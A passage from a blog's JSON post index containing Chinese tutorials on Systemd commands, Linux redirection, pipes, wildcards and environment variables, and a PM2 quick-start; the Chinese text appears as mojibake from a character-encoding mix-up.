è¿™ä¸ªåå­—çš„å«ä¹‰ï¼Œå°±æ˜¯å®ƒè¦å®ˆæŠ¤æ•´ä¸ªç³»ç»Ÿã€‚ ä½¿ç”¨äº† Systemdï¼Œå°±ä¸éœ€è¦å†ç”¨init äº†ã€‚Systemd å–ä»£äº†initdï¼ˆInitd çš„PID æ˜¯0ï¼‰ ï¼Œæˆä¸ºç³»ç»Ÿçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼ˆSystemd çš„PID ç­‰äº 1ï¼‰ï¼Œå…¶ä»–è¿›ç¨‹éƒ½æ˜¯å®ƒçš„å­è¿›ç¨‹ã€‚ Systemd çš„ä¼˜ç‚¹æ˜¯åŠŸèƒ½å¼ºå¤§ï¼Œä½¿ç”¨æ–¹ä¾¿ï¼Œç¼ºç‚¹æ˜¯ä½“ç³»åºå¤§ï¼Œéå¸¸å¤æ‚ã€‚ æŸ¥çœ‹Systemd çš„ç‰ˆæœ¬ä¿¡æ¯ 1$ systemctl --version ç³»ç»Ÿç®¡ç†Systemd å¹¶ä¸æ˜¯ä¸€ä¸ªå‘½ä»¤ï¼Œè€Œæ˜¯ä¸€ç»„å‘½ä»¤ï¼Œæ¶‰åŠåˆ°ç³»ç»Ÿç®¡ç†çš„æ–¹æ–¹é¢é¢ã€‚ systemctlsystemctlæ˜¯ Systemd çš„ä¸»å‘½ä»¤ï¼Œç”¨äºç®¡ç†ç³»ç»Ÿã€‚ 12345678&#x2F;&#x2F; é‡å¯ç³»ç»Ÿ$ sudo systemctl reboot&#x2F;&#x2F; å¯åŠ¨è¿›å…¥æ•‘æ´çŠ¶æ€ï¼ˆå•ç”¨æˆ·çŠ¶æ€ï¼‰$ sudo systemctl rescue&#x2F;&#x2F; ç®¡ç†æœåŠ¡$ sudo systemctl start nginx hostnamectlhostnamectlå‘½ä»¤ç”¨äºæŸ¥çœ‹å½“å‰ä¸»æœºçš„ä¿¡æ¯ã€‚ 12345&#x2F;&#x2F; æ˜¾ç¤ºå½“å‰ä¸»æœºä¿¡æ¯$ hostnamectl&#x2F;&#x2F; è®¾ç½®ä¸»æœºå$ sudo hostnamectl set-hostname BoodeUbuntu localectllocalectlå‘½ä»¤ç”¨äºæŸ¥çœ‹æœ¬åœ°åŒ–è®¾ç½®ã€‚ 123456&#x2F;&#x2F; æŸ¥çœ‹æœ¬åœ°åŒ–è®¾ç½®$ localectl&#x2F;&#x2F; è®¾ç½®æœ¬åœ°åŒ–å‚æ•°ã€‚$ sudo localectl set-locale LANG&#x3D;en_GB.utf8$ sudo localectl set-keymap en_GB timedatectltimedatectlå‘½ä»¤ç”¨äºæŸ¥çœ‹å½“å‰æ—¶åŒºè®¾ç½®ã€‚ 12345678910&#x2F;&#x2F; æŸ¥çœ‹å½“å‰æ—¶åŒºè®¾ç½®$ timedatectl&#x2F;&#x2F; æ˜¾ç¤ºæ‰€æœ‰å¯ç”¨çš„æ—¶åŒº$ timedatectl list-timezones &#x2F;&#x2F; è®¾ç½®å½“å‰æ—¶åŒº$ sudo timedatectl set-timezone America&#x2F;New_York$ sudo timedatectl set-time YYYY-MM-DD$ sudo timedatectl set-time HH:MM:SS æ€»ç»“ init æ˜¯æœ€åˆçš„è¿›ç¨‹ç®¡ç†æ–¹å¼ service æ˜¯init çš„å¦ä¸€ç§å®ç° systemd åˆ™æ˜¯ä¸€ç§å–ä»£ initd çš„è§£å†³æ–¹æ¡ˆ å…¶ä¸­ systemctl æ˜¯ systemd çš„ä¸»å‘½ä»¤ï¼Œç”¨äºç®¡ç†ç³»ç»Ÿä»¥åŠæœåŠ¡ã€‚ å‚è€ƒé“¾æ¥ Linux Init - ç»´åŸºç™¾ç§‘ Systemd å…¥é—¨æ•™ç¨‹ - é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿— initã€serviceã€systemctl çš„åŒºåˆ« Linux å®ˆæŠ¤è¿›ç¨‹çš„å¯åŠ¨æ–¹å¼","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"äº†è§£ Linuxçš„ç®¡é“ç¬¦ã€é‡å®šå‘ã€ç¯å¢ƒå˜é‡","slug":"understand-linux-pipe-symbols-redirects-environment-variables","date":"2020-07-13T15:48:12.000Z","updated":"2020-07-14T15:49:18.916Z","comments":true,"path":"understand-linux-pipe-symbols-redirects-environment-variables/","link":"","permalink":"https://www.0x2beace.com/understand-linux-pipe-symbols-redirects-environment-variables/","excerpt":"è¿™ç¯‡æ–‡ç« æµ…è°ˆä¸€ä¸‹ Linux çš„ç®¡é“ç¬¦ã€é‡å®šå‘å’Œç¯å¢ƒå˜é‡ã€‚","text":"è¿™ç¯‡æ–‡ç« æµ…è°ˆä¸€ä¸‹ Linux çš„ç®¡é“ç¬¦ã€é‡å®šå‘å’Œç¯å¢ƒå˜é‡ã€‚ è¾“å…¥è¾“å‡ºé‡å®šå‘åœ¨äº†è§£ä»€ä¹ˆæ˜¯è¾“å…¥è¾“å‡ºé‡å®šå‘ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆè¦ææ¸…æ¥šä»¥ä¸‹ä¸¤ç§è¾“å‡ºä¿¡æ¯çš„åŒºåˆ«ï¼š æ ‡å‡†è¾“å‡ºä¿¡æ¯ï¼šåŒ…æ‹¬è¯¥æ–‡ä»¶çš„ä¸€äº›ç›¸å…³æƒé™ã€æ‰€æœ‰è€…ã€æ‰€å±ç»„ã€æ–‡ä»¶å¤§å°åŠä¿®æ”¹æ—¶é—´ç­‰ä¿¡æ¯ã€‚ é”™è¯¯è¾“å‡ºä¿¡æ¯ï¼šBashç»ˆç«¯æ˜¾ç¤ºçš„æŠ¥é”™æç¤ºä¿¡æ¯123456[max@localhost æ¡Œé¢]$ lstestdir test.txt[max@localhost æ¡Œé¢]$ cat test.txtHello Linux! # æ ‡å‡†è¾“å‡ºä¿¡æ¯[max@localhost æ¡Œé¢]$ cat xxxcat: xxx: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• # é”™è¯¯è¾“å‡ºä¿¡æ¯ å› ä¸ºä¸å­˜åœ¨xxxæ–‡ä»¶ æ ‡å‡†è¾“å…¥é‡å®šå‘ï¼ˆSTDINï¼Œæ–‡ä»¶æè¿°ç¬¦ä¸º0ï¼‰ï¼šé»˜è®¤ä»é”®ç›˜è¾“å…¥ï¼Œä¹Ÿå¯ä»å…¶ä»–æ–‡ä»¶æˆ–å‘½ä»¤ä¸­è¾“å…¥ã€‚ æ ‡å‡†è¾“å‡ºé‡å®šå‘ï¼ˆSTDOUTï¼Œæ–‡ä»¶æè¿°ç¬¦ä¸º1ï¼‰ï¼šé»˜è®¤è¾“å‡ºåˆ°å±å¹•ã€‚ é”™è¯¯è¾“å‡ºé‡å®šå‘ï¼ˆSTDERRï¼Œæ–‡ä»¶æè¿°ç¬¦ä¸º2ï¼‰ï¼šé»˜è®¤è¾“å‡ºåˆ°å±å¹•ã€‚ ä¹‹æ‰€ä»¥èŠ±è¿™ä¹ˆå¤§åŠ›æ°”ï¼Œç†è§£è¿™ä¸ªæ¦‚å¿µï¼Œæ˜¯å› ä¸ºå¾…ä¼šæœ‰ä¸ªå¾ˆé‡è¦çš„çŸ¥è¯†ç‚¹è¦ç”¨åˆ°è¿™ä¸ªæ¦‚å¿µã€‚ è¾“å‡ºé‡å®šå‘123456å‘½ä»¤ &gt; æ–‡ä»¶ å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆæ¸…ç©ºåŸæœ‰æ–‡ä»¶çš„æ•°æ®ï¼‰å‘½ä»¤ 2&gt; æ–‡ä»¶ å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆæ¸…ç©ºåŸæœ‰æ–‡ä»¶çš„æ•°æ®ï¼‰å‘½ä»¤ &gt;&gt; æ–‡ä»¶ å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆè¿½åŠ åˆ°åŸæœ‰å†…å®¹çš„åé¢ï¼‰å‘½ä»¤ 2&gt;&gt; æ–‡ä»¶ å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆè¿½åŠ åˆ°åŸæœ‰å†…å®¹çš„åé¢ï¼‰å‘½ä»¤ &gt;&gt; æ–‡ä»¶ 2&gt;&amp;1 æˆ–å‘½ä»¤ &amp;&gt;&gt; æ–‡ä»¶ å°†æ ‡å‡†è¾“å‡ºä¸é”™è¯¯è¾“å‡ºå…±åŒå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼ˆè¿½åŠ åˆ°åŸæœ‰å†…å®¹çš„åé¢ï¼‰ å®ä¾‹ï¼š 12345678910[max@localhost æ¡Œé¢]$ cat test.txtHello Linux![max@localhost æ¡Œé¢]$ echo &quot;æµ‹è¯•è¾“å‡ºé‡å®šå‘(è¿½åŠ æ¨¡å¼)&quot; &gt;&gt; test.txt[max@localhost æ¡Œé¢]$ cat test.txt Hello Linux!æµ‹è¯•è¾“å‡ºé‡å®šå‘(è¿½åŠ æ¨¡å¼)[max@localhost æ¡Œé¢]$ echo &quot;æµ‹è¯•è¾“å‡ºé‡å®šå‘(æ¸…é™¤æ¨¡å¼)&quot; &gt; test.txt[max@localhost æ¡Œé¢]$ cat test.txtæµ‹è¯•è¾“å‡ºé‡å®šå‘(æ¸…é™¤æ¨¡å¼) è¾“å…¥é‡å®šå‘123å‘½ä»¤ &lt; æ–‡ä»¶ å°†æ–‡ä»¶ä½œä¸ºå‘½ä»¤çš„æ ‡å‡†è¾“å…¥å‘½ä»¤ &lt;&lt; åˆ†ç•Œç¬¦ ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å…¥ï¼Œç›´åˆ°é‡è§åˆ†ç•Œç¬¦æ‰åœæ­¢å‘½ä»¤ &lt; æ–‡ä»¶1 &gt; æ–‡ä»¶2 å°†æ–‡ä»¶1ä½œä¸ºå‘½ä»¤çš„æ ‡å‡†è¾“å…¥å¹¶å°†æ ‡å‡†è¾“å‡ºåˆ°æ–‡ä»¶2 è¾“å…¥é‡å®šå‘ç›¸å¯¹äºè¾“å‡ºé‡å®šå‘è¾ƒä½¿ç”¨çš„å°‘ä¸€äº›ï¼Œå¯ä»¥ç†è§£ä¸ºï¼šè¾“å…¥é‡å®šå‘çš„ä½œç”¨æ˜¯æŠŠæ–‡ä»¶ç›´æ¥å¯¼å…¥åˆ°å‘½ä»¤ä¸­ã€‚ä¾‹å­ï¼š 123# å°†æ–‡ä»¶text.txtå¯¼å…¥ç»™ &#96;wc -l&#96;å‘½ä»¤ï¼Œç»Ÿè®¡è¡Œæ•°ã€‚[max@localhost æ¡Œé¢]$ wc -l &lt; test.txt1 ç®¡é“ç¬¦ç®¡é“ç¬¦çš„æ¦‚å¿µå°±æ˜¯ï¼šæŠŠå‰ä¸€ä¸ªå‘½ä»¤åŸæœ¬è¦è¾“å‡ºåˆ°å±å¹•çš„æ ‡å‡†æ­£å¸¸æ•°æ®å½“ä½œæ˜¯åä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å…¥ã€‚ ä¸¾ä¸ªä¾‹å­ï¼ŒæŠŠetcç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶çš„å±æ€§ä¿¡æ¯ï¼Œä½œä¸ºæ ‡å‡†è¾“å…¥ä¼ é€’ç»™ moreå‘½ä»¤ã€‚ 12345678[max@localhost æ¡Œé¢]$ ls -l &#x2F;etc&#x2F; | moreæ€»ç”¨é‡ 1396drwxr-xr-x. 3 root root 97 8æœˆ 24 04:35 abrt-rw-r--r--. 1 root root 16 8æœˆ 24 04:43 adjtime-rw-r--r--. 1 root root 21929 1æœˆ 29 2014 brltty.confdrwxr-xr-x. 2 root root 6 1æœˆ 29 2014 chkconfig.d-rw-r--r--. 1 root root 1157 2æœˆ 6 2014 chrony.conf--More-- å‘½ä»¤è¡Œä¸­çš„é€šé…ç¬¦ æ˜Ÿå·ï¼ˆ*ï¼‰ä»£è¡¨åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ é—®å·ï¼ˆ?ï¼‰ä»£è¡¨åŒ¹é…å•ä¸ªå­—ç¬¦ ä¸­æ‹¬å·å†…åŠ ä¸Šæ•°å­—[0-9]ä»£è¡¨åŒ¹é…0ï½9ä¹‹é—´çš„å•ä¸ªæ•°å­—çš„å­—ç¬¦ è€Œä¸­æ‹¬å·å†…åŠ ä¸Šå­—æ¯[abc]åˆ™æ˜¯ä»£è¡¨åŒ¹é…aã€bã€cä¸‰ä¸ªå­—ç¬¦ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦123456789101112131415161718[max@localhost test]$ lsfile1 file2 file3 file99 filex[max@localhost test]$ ls -l file?-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file1-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file2-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file3-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 filex[max@localhost test]$ ls -l file*-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file1-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file2-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file3-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file99-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 filex[max@localhost test]$ ls -l file[1-2]-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file1-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 file2[max@localhost test]$ ls -l file[x]-rw-rw-r--. 1 max max 0 10æœˆ 10 22:49 filex å¸¸ç”¨çš„è½¬ä¹‰å­—ç¬¦ åæ–œæ ï¼ˆ\\ï¼‰ï¼šä½¿åæ–œæ åé¢çš„ä¸€ä¸ªå˜é‡å˜ä¸ºå•çº¯çš„å­—ç¬¦ä¸²ã€‚ å•å¼•å·ï¼ˆâ€™â€™ï¼‰ï¼šè½¬ä¹‰å…¶ä¸­æ‰€æœ‰çš„å˜é‡ä¸ºå•çº¯çš„å­—ç¬¦ä¸²ã€‚ åŒå¼•å·ï¼ˆâ€â€ï¼‰ï¼šä¿ç•™å…¶ä¸­çš„å˜é‡å±æ€§ï¼Œä¸è¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚ åå¼•å·ï¼ˆ``ï¼‰ï¼šæŠŠå…¶ä¸­çš„å‘½ä»¤æ‰§è¡Œåè¿”å›ç»“æœã€‚ 123[max@localhost test]$ PRICE&#x3D;5[max@localhost test]$ echo &quot;The price of this shirt is $PRICE&quot;The price of this shirt is 5 ä¸Šé¢çš„è¾“å‡ºçœ‹ä¸Šå»æŒºå¯¹çš„ï¼Œä½†æ˜¯å¹¶ä¸å®Œç¾ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿè¾“å‡ºâ€œThe price of this shirt is $5â€ï¼Œäºæ˜¯æˆ‘ä»¬è¯•ç€è¿™æ ·å†™ï¼š 12[max@localhost test]$ echo &quot;The price of this shirt is $$PRICE&quot;The price of this shirt is 9944PRICE ä¸å¹¸çš„æ˜¯ç¾å…ƒç¬¦å·å’Œå˜é‡æå–ç¬¦å·åˆå¹¶å$$ä½œç”¨æ˜¯æ˜¾ç¤ºå½“å‰ç¨‹åºçš„è¿›ç¨‹IDã€‚ è¦æƒ³è®©ç¬¬ä¸€ä¸ª$ä¹–ä¹–åœ°ä½œä¸ºç¾å…ƒç¬¦å·ï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨åæ–œæ \\æ¥è¿›è¡Œè½¬ä¹‰ï¼Œå°†è¿™ä¸ªå‘½ä»¤æå–ç¬¦è½¬ä¹‰æˆå•çº¯çš„æ–‡æœ¬ï¼Œå»é™¤å…¶ç‰¹æ®ŠåŠŸèƒ½ã€‚ 12[max@localhost test]$ echo &quot;The price of this shirt is \\$$PRICE&quot;The price of this shirt is $5 å¦‚æœåªéœ€è¦æŸä¸ªå‘½ä»¤çš„è¾“å‡ºå€¼æ—¶ï¼Œå¯ä»¥åƒå‘½ä»¤è¿™æ ·ï¼Œå°†å‘½ä»¤ç”¨åå¼•å·æ‹¬èµ·æ¥ï¼Œè¾¾åˆ°é¢„æœŸçš„æ•ˆæœ. 123[max@localhost test]$ echo &#96;uname -a&#96; &gt;&gt; file1[max@localhost test]$ cat file1Linux localhost.localdomain 3.10.0-123.el7.x86_64 #1 SMP Mon May 5 11:16:57 EDT 2014 x86_64 x86_64 x86_64 GNU&#x2F;Linux æ€è€ƒï¼šå¦‚ä½•å°†æ™®é€šå˜é‡è½¬æ¢ä¸ºå…¨å±€å˜é‡ï¼Ÿ ä½¿ç”¨å‘½ä»¤ï¼šexport [å˜é‡åç§°]ï¼Œéœ€è¦åœ¨æ‹¥æœ‰ç®¡ç†å‘˜æƒé™æ—¶æ‰èƒ½æ­£å¸¸ä½¿ç”¨ã€‚ 12345678910111213141516[root@localhost home]# WORKDIR&#x3D;&#x2F;home&#x2F;workdir[root@localhost home]# mkdir $WORKDIR [root@localhost home]# cd $WORKDIR[root@localhost workdir]# pwd&#x2F;home&#x2F;workdir[root@localhost workdir]# exitexit[max@localhost home]$ cd $WORKDIR[max@localhost ~]$ echo $WORKDIR[max@localhost ~]$ su rootå¯†ç ï¼š[root@localhost max]# export WORKDIR[root@localhost &#x2F;]# su max[max@localhost &#x2F;]$ cd $WORKDIR[max@localhost workdir]$ pwd&#x2F;home&#x2F;workdir é‡ç‚¹ä¸€ï¼šåœ¨ä¸Šé¢çš„å‘½ä»¤ä¸­æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„çŸ¥è¯†ç‚¹ï¼š å…³äºå¦‚ä½•åœ¨Linuxä¸­åˆ›å»ºä¸€ä¸ªå˜é‡çš„é—®é¢˜ï¼Ÿæœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ã€‚ æ‰€æœ‰å­—æ¯éƒ½éœ€è¦å¤§å†™ å˜é‡ä¸èµ‹å€¼ç¬¦å·(=)ä¹‹é—´ä¸èƒ½å­˜åœ¨ç©ºæ ¼ æ— è®ºæ˜¯ç³»ç»Ÿç¯å¢ƒå˜é‡è¿˜æ˜¯è‡ªå®šä¹‰å˜é‡è¿˜æ˜¯å…¨å±€å˜é‡ï¼Œåœ¨è°ƒç”¨æ—¶ éƒ½éœ€è¦ä½¿ç”¨$ç¬¦å·æ¥æ ‡è¯†ã€‚ é‡ç‚¹äºŒ åœ¨Linux ç³»ç»Ÿä¸­å½“æ™®é€šç”¨æˆ·èº«ä»½æ—¶å‘½ä»¤æç¤ºç¬¦çš„å‰ç¼€æ ‡è¯†æ˜¯ï¼š$ã€‚ åœ¨Linux ç³»ç»Ÿä¸­å½“ä¸ºç®¡ç†å‘˜èº«ä»½æ—¶å‘½ä»¤æç¤ºç¬¦çš„å‰ç¼€æ ‡è¯†æ˜¯ï¼š#ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"PM2 å¿«é€Ÿä¸Šæ‰‹","slug":"pm2-quick-start","date":"2020-07-12T13:44:47.000Z","updated":"2020-09-04T13:54:47.036Z","comments":true,"path":"pm2-quick-start/","link":"","permalink":"https://www.0x2beace.com/pm2-quick-start/","excerpt":"PM2 æ˜¯Node.js ç”Ÿäº§ç¯å¢ƒä¸­çš„è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œè‡ªå¸¦è´Ÿè½½å‡è¡¡åŠŸèƒ½ã€‚","text":"PM2 æ˜¯Node.js ç”Ÿäº§ç¯å¢ƒä¸­çš„è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œè‡ªå¸¦è´Ÿè½½å‡è¡¡åŠŸèƒ½ã€‚ å®‰è£… 1$ npm install pm2 -g æ— ç¼æ›´æ–° 1$ pm2 update å¯åŠ¨åº”ç”¨PM2 ä¸­æœ‰ä¸¤ç§æ–¹å¼å¯åŠ¨åº”ç”¨ï¼Œä¸€ç§æ˜¯ç›´æ¥è°ƒç”¨åº”ç”¨å…¥å£æ–‡ä»¶ï¼Œä¸€ç§æ˜¯é€šè¿‡è°ƒç”¨é…ç½®æ–‡ä»¶å¯åŠ¨åº”ç”¨ã€‚ å‘½ä»¤è¡Œå¯åŠ¨åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œé€šè¿‡å‘½ä»¤è¡Œå¯åŠ¨æœåŠ¡ 1$ pm2 stat app.js é…ç½®æ–‡ä»¶å¯åŠ¨å¾ˆå¤šæ—¶å€™ï¼Œä»…ä»…åªæ˜¯ä½¿ç”¨ PM2 å»å¯åŠ¨åº”ç”¨ï¼Œå¯èƒ½ä¸èƒ½å®Œå…¨æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚ å½“éœ€è¦å¯¹åº”ç”¨æœ‰æ›´å¤šçš„è¦æ±‚æ—¶ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°PM2 çš„é…ç½®æ–‡ä»¶äº†ã€‚ PM2 æ”¯æŒé€šè¿‡é…ç½®æ–‡ä»¶åˆ›å»ºç®¡ç†åº”ç”¨ï¼Œé¦–å…ˆåœ¨é¡¹ç›®æ ¹ç›®å½•æ‰‹åŠ¨åˆ›å»ºé…ç½®æ–‡ä»¶precesses.jsonï¼š 12345678910&#123; &quot;apps&quot;: [ &#123; &quot;name&quot;: &quot;myApp&quot;, &quot;cwd&quot;: &quot;&#x2F;var&#x2F;www&#x2F;app&#x2F;&quot;, &quot;script&quot;: &quot;.&#x2F;app.js&quot;, &quot;watch&quot;: true &#125; ]&#125; æˆ–è€…ç›´æ¥ä½¿ç”¨ pm2 init å‘½ä»¤ï¼Œè‡ªåŠ¨åˆ›å»ºé»˜è®¤çš„ecosystem.config.jsé…ç½®æ–‡ä»¶ï¼š 1234567module.exports &#x3D; &#123; apps : [&#123; name: &quot;myApp&quot;, script: &#39;index.js&#39;, watch: &#39;.&#39; &#125;&#125;; è¿™ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥åˆ›å»ºç®¡ç†åº”ç”¨ï¼Œä½œç”¨éƒ½æ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«åªæ˜¯ï¼šä¸€ä¸ªæ˜¯jsonæ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯jsæ ¼å¼çš„é…ç½®æ–‡ä»¶ã€‚ ä¸Šé¢æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„processes.jsoné…ç½®ï¼Œåˆ›å»ºäº†ä¸€ä¸ªmyAppåº”ç”¨ï¼Œå¦‚æœä½ æœ‰å¤šä¸ªæœåŠ¡ï¼Œé‚£ä¹ˆapps è¿™ä¸ªæ•°ç»„ä¸­åˆ›å»ºå¤šä¸ªåº”ç”¨ã€‚ åˆ›å»ºå¥½é…ç½®æ–‡ä»¶ä¹‹åï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•å¯åŠ¨å‘¢ï¼Ÿ æœ‰ä¸¤ç§æ–¹å¼ï¼š ç›´æ¥è°ƒç”¨é…ç½®æ–‡ä»¶å¯åŠ¨ 1$ pm2 start processes.json å¯ä»¥å¢åŠ --envå‚æ•°ï¼Œæ¥æŒ‡å®šå½“å‰å¯åŠ¨ç¯å¢ƒã€‚ é€šè¿‡package.json é…ç½®æ–‡ä»¶ï¼Œé…ç½®è„šæœ¬å¯åŠ¨ 123456&#x2F;&#x2F; package.json&quot;scripts&quot;: &#123; &quot;start&quot;: &quot;node server&#x2F;index&quot;, &quot;pm2&quot;: &quot;pm2 start processes.json&quot; &#125; ç„¶åå°±å¯ä»¥ç›´æ¥ä½¿ç”¨npm start pm2 æ¥å¯åŠ¨åº”ç”¨äº†ã€‚ å‚æ•°è¯´æ˜åœ¨é…ç½®æ–‡ä»¶ä½ å¯ä»¥æŒ‡å®šç¯å¢ƒå˜é‡ã€æ—¥å¿—æ–‡ä»¶ã€è¿›ç¨‹æ–‡ä»¶ï¼Œé‡å¯æœ€å¤§æ¬¡æ•°â€¦ç­‰é…ç½®é¡¹ã€‚æ”¯æŒJSONå’ŒYAMLæ ¼å¼ã€‚ PM2 çš„é…ç½®æ”¯æŒéå¸¸å¤šçš„å‚æ•°ï¼Œä¸‹é¢ä¼šå¯¹å¸¸ç”¨çš„å‚æ•°ä¸€ä¸€åšè¯´æ˜ã€‚ å­—æ®µ ç±»å‹ å€¼ æè¿° name string myApp åº”ç”¨çš„åå­—ï¼Œé»˜è®¤æ˜¯è„šæœ¬æ–‡ä»¶å cwd string /var/www/myApp åº”ç”¨ç¨‹åºæ‰€åœ¨ç›®å½• script string ./server.js åº”ç”¨ç¨‹åºçš„è„šæœ¬è·¯å¾„ï¼Œç›¸å¯¹äºåº”ç”¨ç¨‹åºæ‰€åœ¨ç›®å½• log_date_format string YYYY-MM-DD HH:mm Z æ—¥å¿—æ—¶é—´æ ¼å¼ error_file string - é”™è¯¯æ—¥å¿—å­˜æ”¾è·¯å¾„ out_file string - è¾“å‡ºæ—¥å¿—å­˜æ”¾è·¯å¾„ pid_file string - pidæ–‡ä»¶è·¯å¾„ watch boolean or array true å½“ç›®å½•æ–‡ä»¶æˆ–å­ç›®å½•æ–‡ä»¶æœ‰å˜åŒ–æ—¶è‡ªåŠ¨é‡æ–°åŠ è½½åº”ç”¨ ignore_watch list [â€[/]./â€, â€œnode_modulesâ€] listä¸­çš„æ­£åˆ™åŒ¹é…çš„æ–‡ä»¶å’Œç›®å½•æœ‰å˜åŒ–æ—¶ä¸é‡æ–°åŠ è½½åº”ç”¨ max_memory_restart string 50M å½“åº”ç”¨è¶…è¿‡è®¾å®šçš„å†…å­˜å¤§å°å°±è‡ªåŠ¨é‡å¯ min_uptime string 60s æœ€å°è¿è¡Œæ—¶é—´ï¼Œè¿™é‡Œè®¾ç½®çš„æ˜¯60så³å¦‚æœåº”ç”¨ç¨‹åºåœ¨60så†…é€€å‡ºï¼Œpm2ä¼šè®¤ä¸ºç¨‹åºå¼‚å¸¸é€€å‡ºï¼Œæ­¤æ—¶è§¦å‘é‡å¯max_restartsè®¾ç½®æ•°é‡ max_restarts number 10 è®¾ç½®åº”ç”¨ç¨‹åºå¼‚å¸¸é€€å‡ºé‡å¯çš„æ¬¡æ•°ï¼Œé»˜è®¤15æ¬¡ï¼ˆä»0å¼€å§‹è®¡æ•°ï¼‰ instances number 1 å¯åŠ¨å®ä¾‹ä¸ªæ•° cron_restart string 1 0 * * * å®šæ—¶é‡å¯ exec_interpreter string node åº”ç”¨ç¨‹åºçš„è„šæœ¬ç±»å‹ï¼Œé»˜è®¤æ˜¯node exec_mode string fork åº”ç”¨å¯åŠ¨æ¨¡å¼ï¼Œæ”¯æŒforkå’Œclusteræ¨¡å¼ï¼Œé»˜è®¤ä¸ºfork autorestart boolean true åº”ç”¨ç¨‹åºå´©æºƒæˆ–é€€å‡ºæ—¶è‡ªåŠ¨é‡å¯ æœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ âš ï¸ï¼š å¦‚æœprocesses.jsonæˆ–è€…ecosystem.config.js é…ç½®æ–‡ä»¶å¦‚æœå‘ç”Ÿäº†å˜åŒ–ï¼Œå»ºè®®ç›´æ¥åˆ é™¤åº”ç”¨ä¹‹åï¼Œé‡æ–°åˆ›å»ºï¼Œå¦åˆ™å¯èƒ½éƒ¨åˆ†é…ç½®ä¸ä¼šç”Ÿæ•ˆã€‚ cwd ä¸è¦å¡«ç»å¯¹è·¯å¾„ï¼Œå»ºè®®ç”¨ç›¸å¯¹è·¯å¾„ï¼Œ./è¡¨ç¤ºç›¸å¯¹äºé…ç½®æ–‡ä»¶æ ¹ç›®å½•ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°é™æ€èµ„æºä¸¢å¤±çš„æƒ…å†µã€‚ è¿›ç¨‹ç›‘æ§åˆ—å‡ºæ‰€æœ‰èŠ‚ç‚¹åº”ç”¨ç¨‹åºï¼ˆè¿›ç¨‹/å¾®æœåŠ¡ï¼‰ 12$ pm2 list$ pm2 ls å¯ä»¥å°†è¿›ç¨‹åˆ—è¡¨ä»¥JSONæ ¼å¼æ‰“å°å‡ºæ¥ï¼š 12$ pm2 jlist$ pm2 prettylist ä½¿ç”¨è¿›ç¨‹IDæˆ–åç§°æŸ¥çœ‹æ‰€ç¤ºçš„å•ä¸ªNodeè¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ï¼š 12$ pm2 describe &lt;id | app_name&gt;$ pm2 show &lt;id | app_name&gt; å®æ—¶ç›‘æ§æ‰€æœ‰è¿›ç¨‹CPUæˆ–å†…å­˜ä½¿ç”¨æƒ…å†µï¼š 1$ pm2 monit æ—¥å¿—ç®¡ç†æŸ¥çœ‹æŸä¸ªåº”ç”¨çš„æ—¥å¿—ï¼š 1$ pm2 logs 